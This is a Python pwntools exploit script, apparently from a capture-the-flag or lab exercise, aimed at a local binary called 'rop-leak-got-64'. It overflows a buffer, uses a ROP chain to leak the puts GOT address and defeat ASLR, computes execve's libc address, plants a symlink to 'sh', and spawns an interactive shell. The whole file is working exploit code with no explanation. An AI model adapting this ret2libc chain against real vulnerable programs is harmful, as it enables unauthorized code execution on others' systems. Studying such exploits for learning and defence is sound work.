#!/usr/bin/env python

from pwn import *

p = process("./rop-leak-got-64")

e = ELF('/lib/x86_64-linux-gnu/libc.so.6')
puts_offset = e.symbols['puts']
execve_offset = e.symbols['execve']

offset_diff = execve_offset - puts_offset

input_func = p.elf.symbols['input_func']
printf_func = p.elf.symbols['puts']
strcpy_func = p.elf.symbols['strcpy']

print p.recvline()

puts_got = 0x0601018

template = "A" * 0x88

payload = template

#0x0000000000400763 : pop rdi ; ret
#0x0000000000400688 : pop rdx ; nop ; pop rbp ; ret
#0x0000000000400761 : pop rsi ; pop r15 ; ret
p_rdi_r = 0x400763
p_rdx_rbp_r = 0x400688
p_rsi_r15_r = 0x400761


payload += p64(p_rdi_r) + p64(puts_got) + p64(printf_func) + p64(input_func)

p.send(payload)

print p.recvline()

data = p.recv(0x100)

print(repr(data))

libc_puts = u64(data[0:6] + "\x00\x00")
print(hex(libc_puts))
print(hex(puts_offset))
libc_execve = libc_puts + offset_diff
print(hex(libc_execve))

import os
if not os.path.exists("\xb8"):
    os.symlink("sh", "\xb8")

string = 0x4006ea
payload = template
payload += p64(p_rdi_r) + p64(string) + p64(p_rsi_r15_r) + p64(0) + p64(0) + \
            p64(p_rdx_rbp_r) + p64(0) + p64(0) + p64(libc_execve)

with open('exploit.txt', 'wb') as f:
    f.write(payload)

p.send(payload)
p.interactive()
